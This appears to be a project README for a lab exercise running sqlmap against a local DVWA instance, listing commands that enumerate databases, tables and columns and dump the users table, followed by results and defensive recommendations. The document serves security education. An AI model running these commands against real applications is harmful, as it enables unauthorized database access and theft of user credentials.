# Project Documentation: SQL Injection Testing with SQLmap

## 1. Introduction
This project demonstrates how to identify and exploit SQL Injection vulnerabilities using **SQLmap**, an automated SQL Injection tool. The target application is the Damn Vulnerable Web Application (DVWA), configured at low security level for educational purposes.

---

## 2. Objectives
- To understand how SQL Injection vulnerabilities work.
- To use SQLmap for detecting and exploiting SQL Injection flaws.
- To extract database information including databases, tables, columns, and data.
- To generate detailed reports based on the findings.

---

## 3. Tools and Technologies
- **SQLmap**: An open-source penetration testing tool.
- **DVWA**: Vulnerable web application for practice.
- **Python**: To run sqlmap scripts.
- **Docker**: Hosting DVWA locally (optional).
- **Git & VS Code**: For version control and code editing.

---

## 4. System Requirements
- Operating System: Windows/Linux/MacOS
- Python 3.x installed
- Git installed
- Docker (optional for hosting DVWA)
- Internet access for downloading dependencies

---

## 5. Setup and Installation

### a. Setting up DVWA
- Download and run DVWA using Docker or set it up on a local webserver.
- Set security level to 'low' for easy testing.

### b. Installing SQLmap
- Download SQLmap from [official repo](https://github.com/sqlmapproject/sqlmap).
- Ensure Python is installed.
- Run sqlmap via terminal or command prompt.


## 6. Usage

### Detecting SQL Injection and Enumerating Databases
```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch --dbs
````

### Listing Tables

```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa --tables
```

### Listing Columns

```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --columns
```

### Dumping Data

```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --dump



## 7. Results and Analysis

* Databases found: `dvwa`, `information_schema`.
* Tables in `dvwa`: `users`, `guestbook`.
* Extracted user data with hashed passwords.
* Vulnerability confirmed via successful data extraction.

## 8. Recommendations

* Use parameterized queries to prevent SQL Injection.
* Hash passwords with strong algorithms like bcrypt.
* Implement input validation and sanitization.
* Employ Web Application Firewalls (WAFs).
* Avoid exposing detailed error messages.

## 9. Conclusion

This project highlights the dangers of SQL Injection vulnerabilities and the ease with which attackers can exploit them using automated tools like SQLmap. Proper security practices are critical to safeguard applications.

## 10. References

* [SQLmap Official GitHub](https://github.com/sqlmapproject/sqlmap)
* [Damn Vulnerable Web Application (DVWA)](http://www.dvwa.co.uk/)
* OWASP SQL Injection Prevention Cheat Sheet
